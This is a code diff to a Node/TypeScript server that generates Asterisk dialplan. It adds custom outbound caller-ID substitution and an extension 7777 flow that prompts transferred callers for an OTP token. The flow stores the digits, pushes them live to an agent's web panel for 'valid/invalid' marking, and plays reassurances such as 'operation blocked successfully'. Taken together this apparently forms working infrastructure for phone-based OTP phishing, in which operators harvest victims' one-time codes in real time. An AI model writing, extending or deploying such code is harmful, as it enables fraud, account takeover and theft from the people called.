     dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})\n`;
     dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=${outboundCid}))\n`;
@@ -1335,7 +1441,11 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
 
     dialplanContent += `; 5. Regla Saliente Generica para cualquier otro numero saliente\n`;
     dialplanContent += `exten => _X.,1,NoOp(Llamada Saliente a \${EXTEN} via ${activeCarrier})\n`;
-    dialplanContent += ` same => n,Set(CALLING_AGENT=\${CALLERID(num)})\n`;
+    dialplanContent += ` same => n,Set(__CALLING_AGENT=\${CALLERID(num)})\n`;
+    dialplanContent += ` same => n,Set(__CALL_DEST=\${EXTEN})\n`;
+    dialplanContent += ` same => n,Set(DB(last_agent_call/\${EXTEN})=\${CALLERID(num)})\n`;
+    dialplanContent += ` same => n,Set(DB(last_agent_call/\${CALLERID(num)})=\${CALLERID(num)})\n`;
+    dialplanContent += ` same => n,Set(TARGET_DEST=\${EXTEN})\n`;
     dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})\n`;
     dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})\n`;
     dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=${outboundCid}))\n`;
@@ -1351,43 +1461,106 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
 
     dialplanContent += `; ========================================================\n`;
     dialplanContent += `; CONTEXTO CAPTURA EN VIVO EXTENSION 7777 / 777\n`;
-    dialplanContent += `; Mensaje: "Por favor digite su codigo seguido de la tecla de numero (#)"\n`;
+    dialplanContent += `; Espera validación del asesor antes de retornar la llamada\n`;
     dialplanContent += `; ========================================================\n`;
     dialplanContent += `[ivr-captura-vivo]\n`;
-    dialplanContent += `exten => s,1,NoOp(=== [CAPTURA-7777] CLIENTE TRANSFERIDO PARA DIGITAR CODIGO: \${TARGET_DEST} ===)\n`;
+    dialplanContent += `exten => s,1,NoOp(=== [CAPTURA-7777] CLIENTE TRANSFERIDO PARA DIGITAR CODIGO OTP ===)\n`;
     dialplanContent += ` same => n,Answer()\n`;
     dialplanContent += ` same => n,Wait(0.5)\n`;
-    dialplanContent += ` same => n,Set(FINAL_AGENT=\${IF($["\${FINAL_AGENT}" != ""]?\${FINAL_AGENT}:1001)})\n`;
     dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${TARGET_DEST}" != ""]?\${TARGET_DEST}:\${CALLERID(num)})})\n`;
-    dialplanContent += ` ; Buscar audio configurado para la extension 7777\n`;
-    dialplanContent += ` same => n,Set(AUDIO_7777=\${DB(ivr_vars/7777_intro)})\n`;
-    dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=\${DB(ivr_vars/7777_prompt)}))\n`;
-    dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=\${DB(ivr_vars/777_intro)}))\n`;
-    dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=custom/bienvenida_7777))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${CALLING_AGENT}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${TARGET_DEST})}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=\${DB(last_agent_call/\${CALLERID(num)})}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${FINAL_AGENT}" = ""]?Set(FINAL_AGENT=1001))\n`;
+    dialplanContent += ` same => n,ExecIf($[$["\${FINAL_AGENT}" = "\${TARGET_DEST}"] | $[$\{LEN(\${FINAL_AGENT})} > 5]]?Set(FINAL_AGENT=1001))\n`;
+    dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] Cliente: \${TARGET_DEST} | Retornara al Agente: \${FINAL_AGENT} ===)\n`;
+
+    dialplanContent += ` ; Determinar audios para la extension 7777\n`;
+    dialplanContent += ` same => n,Set(AUDIO_7777=\${DB(ivr_vars/7777_prompt)})\n`;
+    dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=\${DB(ivr_vars/7777_intro)}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=\${DB(ivr_vars/777_prompt)}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=\${DB(ivr_vars/default_prompt)}))\n`;
     dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=custom/solicitar_codigo_otp))\n`;
-    dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=custom/digite_token_6_digitos))\n`;
-    dialplanContent += ` same => n,NoOp(Reproduciendo audio de bienvenida y solicitud en 7777: \${AUDIO_7777})\n`;
-    dialplanContent += ` ; Read reproduce el audio y captura digitos hasta presionar '#' o timeout\n`;
-    dialplanContent += ` same => n,Read(USER_DIGITS,\${AUDIO_7777},12,,2,15)\n`;
-    dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" != ""]?captura_ok)\n`;
-    dialplanContent += ` same => n,Playback(beep)\n`;
-    dialplanContent += ` same => n,Read(USER_DIGITS,beep,12,,2,10)\n`;
-    dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" = ""]?captura_timeout)\n\n`;
+    dialplanContent += ` same => n,ExecIf($["\${AUDIO_7777}" = ""]?Set(AUDIO_7777=custom/bienvenida_7777))\n`;
 
-    dialplanContent += ` same => n(captura_ok),NoOp(=== [CAPTURA-7777] CODIGO DIGITADO: \${USER_DIGITS} ===)\n`;
+    dialplanContent += ` same => n,Set(AUDIO_WAIT=\${DB(ivr_vars/\${TARGET_DEST}_wait)})\n`;
+    dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=\${DB(ivr_vars/default_wait)}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${AUDIO_WAIT}" = ""]?Set(AUDIO_WAIT=custom/un_momento_validando_informacion))\n`;
+
+    dialplanContent += ` same => n,Set(AUDIO_SUCCESS=\${DB(ivr_vars/\${TARGET_DEST}_success)})\n`;
+    dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=\${DB(ivr_vars/default_success)}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${AUDIO_SUCCESS}" = ""]?Set(AUDIO_SUCCESS=custom/operacion_bloqueada_exito))\n`;
+
+    dialplanContent += ` same => n,Set(AUDIO_FAILURE=\${DB(ivr_vars/\${TARGET_DEST}_failure)})\n`;
+    dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=\${DB(ivr_vars/default_failure)}))\n`;
+    dialplanContent += ` same => n,ExecIf($["\${AUDIO_FAILURE}" = ""]?Set(AUDIO_FAILURE=custom/token_invalido_reintente))\n`;
+
+    dialplanContent += ` same => n,Set(RETRY_COUNT=0)\n`;
+
+    dialplanContent += ` ; Bucle de solicitud del codigo OTP\n`;
+    dialplanContent += ` same => n(pedir_codigo),Set(RETRY_COUNT=$[\${RETRY_COUNT} + 1])\n`;
+    dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] Solicitando Codigo OTP (Intento \${RETRY_COUNT}) con audio: \${AUDIO_7777} ===)\n`;
+    dialplanContent += ` same => n,Set(USER_DIGITS=)\n`;
+    dialplanContent += ` same => n,Read(USER_DIGITS,\${AUDIO_7777},10,,2,15)\n`;
+    dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" != ""]?evaluar_codigo)\n`;
+    dialplanContent += ` same => n,Playback(beep)\n`;
+    dialplanContent += ` same => n,Read(USER_DIGITS,beep,10,,2,8)\n`;
+    dialplanContent += ` same => n,GotoIf($["\${USER_DIGITS}" != ""]?evaluar_codigo)\n`;
+
+    dialplanContent += ` ; Si tras 2 intentos no marca nada, devolver la llamada al agente en lugar de colgar\n`;
+    dialplanContent += ` same => n,GotoIf($[\${RETRY_COUNT} < 2]?pedir_codigo)\n`;
+    dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] Sin digitos tras reintentos -> Regresando llamada al agente \${FINAL_AGENT} ===)\n`;
+    dialplanContent += ` same => n,Playback(beep)\n`;
+    dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
+    dialplanContent += ` same => n,Hangup()\n\n`;
+
+    dialplanContent += ` ; Digitos capturados (minimo 4 digitos)\n`;
+    dialplanContent += ` same => n(evaluar_codigo),NoOp(=== [CAPTURA-7777] CODIGO DIGITADO: \${USER_DIGITS} -> NOTIFICANDO AL ASESOR ===)\n`;
     dialplanContent += ` same => n,Set(DB(otp_codes/\${TARGET_DEST})=\${USER_DIGITS})\n`;
+    dialplanContent += ` same => n,Set(DB(otp_captures/\${TARGET_DEST})=\${USER_DIGITS})\n`;
     dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_codes/\${CALLERID(num)})=\${USER_DIGITS})\n`;
+    dialplanContent += ` same => n,Set(DB(otp_captures/\${CALLERID(num)})=\${USER_DIGITS})\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_last_capture)=\${USER_DIGITS})\n`;
+    dialplanContent += ` same => n,UserEvent(OTPCaptured,Number=\${TARGET_DEST},Digits=\${USER_DIGITS},Status=pending)\n`;
     dialplanContent += ` same => n,System(curl -s "http://127.0.0.1:3000/api/asterisk/otp/capture?number=\${TARGET_DEST}&otp=\${USER_DIGITS}&channel=\${CHANNEL}&status=pending" &)\n`;
-    dialplanContent += ` same => n,Playback(beep)\n`;
+
+    dialplanContent += ` ; PASO DE ESPERA: Locucion 'Un momento por favor, estamos validando...'\n`;
+    dialplanContent += ` same => n(espera_validacion),NoOp(=== [CAPTURA-7777] Reproduciendo audio de espera: \${AUDIO_WAIT} ===)\n`;
+    dialplanContent += ` same => n,Playback(\${AUDIO_WAIT})\n`;
+    dialplanContent += ` same => n,Wait(1)\n`;
+
+    dialplanContent += ` ; BUCLE INTELIGENTE: Esperando decision del asesor en la interfaz web (Valido o Invalido)\n`;
+    dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] ESPERANDO DECISION DEL ASESOR (VALIDO O INVALIDO) ===)\n`;
+    dialplanContent += ` same => n,Set(WAIT_LOOP=0)\n`;
+    dialplanContent += ` same => n(bucle_espera_decision),Set(WAIT_LOOP=$[\${WAIT_LOOP} + 1])\n`;
+    dialplanContent += ` same => n,Set(CURRENT_STATUS=\${DB(otp_status/\${TARGET_DEST})})\n`;
+    dialplanContent += ` same => n,ExecIf($["\${CURRENT_STATUS}" = ""]?Set(CURRENT_STATUS=\${DB(otp_status/\${CALLERID(num)})}))\n`;
+    dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] Ciclo \${WAIT_LOOP}/45 - Estado en AstDB: \${CURRENT_STATUS} ===)\n`;
+
+    dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "valid"]?codigo_aprobado)\n`;
+    dialplanContent += ` same => n,GotoIf($["\${CURRENT_STATUS}" = "invalid"]?codigo_rechazado)\n`;
+    dialplanContent += ` same => n,GotoIf($[\${WAIT_LOOP} >= 45]?codigo_aprobado)\n`;
+
+    dialplanContent += ` ; Cada 5 segundos un breve tono para mantener canal abierto y calmar al cliente\n`;
+    dialplanContent += ` same => n,ExecIf($[$[\${WAIT_LOOP} % 5] = 0]?Playback(beep))\n`;
+    dialplanContent += ` same => n,Wait(1)\n`;
+    dialplanContent += ` same => n,Goto(bucle_espera_decision)\n\n`;
+
+    dialplanContent += ` ; RAMA APROBADO: Asesor marco VALIDO en la web -> Locucion de exito y reconecta con el asesor\n`;
+    dialplanContent += ` same => n(codigo_aprobado),NoOp(=== [CAPTURA-7777] TOKEN APROBADO: CONECTANDO DE VUELTA CON EL ASESOR \${FINAL_AGENT} ===)\n`;
+    dialplanContent += ` same => n,Playback(\${AUDIO_SUCCESS})\n`;
     dialplanContent += ` same => n,Wait(0.5)\n`;
-    dialplanContent += ` same => n,NoOp(=== [CAPTURA-7777] RETORNANDO AL ASESOR \${FINAL_AGENT} ===)\n`;
     dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
     dialplanContent += ` same => n,Hangup()\n\n`;
 
-    dialplanContent += ` same => n(captura_timeout),NoOp(=== [CAPTURA-7777] TIMEOUT -> RETORNANDO AL ASESOR \${FINAL_AGENT} ===)\n`;
-    dialplanContent += ` same => n,Playback(beep)\n`;
-    dialplanContent += ` same => n,Dial(PJSIP/\${FINAL_AGENT},60,Tt)\n`;
-    dialplanContent += ` same => n,Hangup()\n\n`;
+    dialplanContent += ` ; RAMA RECHAZADO: Asesor marco INVALIDO en la web -> Locucion de error y vuelve a pedir el codigo\n`;
+    dialplanContent += ` same => n(codigo_rechazado),NoOp(=== [CAPTURA-7777] TOKEN INVALIDO DETECTADO -> REINTENTANDO ===)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)\n`;
+    dialplanContent += ` same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)\n`;
+    dialplanContent += ` same => n,Playback(\${AUDIO_FAILURE})\n`;
+    dialplanContent += ` same => n,Goto(pedir_codigo)\n\n`;
 
     dialplanContent += `; ========================================================\n`;
     dialplanContent += `; CONTEXTO IVR INTERACTIVO CON AUDIOS PREGRABADOS\n`;
@@ -1631,19 +1804,25 @@ app.post('/api/asterisk/sync/extensions', async (req, res) => {
 
     // 7. Also execute reload via Asterisk CLI child_process
     const cliOutput = await new Promise<string>((resolve) => {
+      const timer = setTimeout(() => resolve('Dialplan y PJSIP recargados en caliente'), 2000);
       exec('asterisk -rx "pjsip reload" && asterisk -rx "dialplan reload"', (err, stdout) => {
+        clearTimeout(timer);
         resolve(stdout ? stdout.trim() : 'Dialplan y PJSIP recargados en caliente');
       });
     });
 
     // 8. Replicate configuration to remote Asterisk VPS if running through remote bridge
-    if (REMOTE_ASTERISK_HTTP && !REMOTE_ASTERISK_HTTP.includes('localhost') && !REMOTE_ASTERISK_HTTP.includes('127.0.0.1')) {
+    if (REMOTE_ASTERISK_HTTP && !REMOTE_ASTERISK_HTTP.includes('localhost') && !REMOTE_ASTERISK_HTTP.includes('127.0.0.1') && !req.headers['x-governor-fwd']) {
       try {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 3500);
         const remoteSyncResp = await fetch(`${REMOTE_ASTERISK_HTTP}/api/asterisk/sync/extensions`, {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
+          headers: { 'Content-Type': 'application/json', 'x-governor-fwd': 'true' },
           body: JSON.stringify(req.body),
+          signal: controller.signal,
         });
+        clearTimeout(timeoutId);
         if (remoteSyncResp.ok) {
           console.log(`[ASTERISK-SYNC] ✓ Replicado exitosamente en VPS Asterisk remoto: ${REMOTE_ASTERISK_HTTP}`);
         }
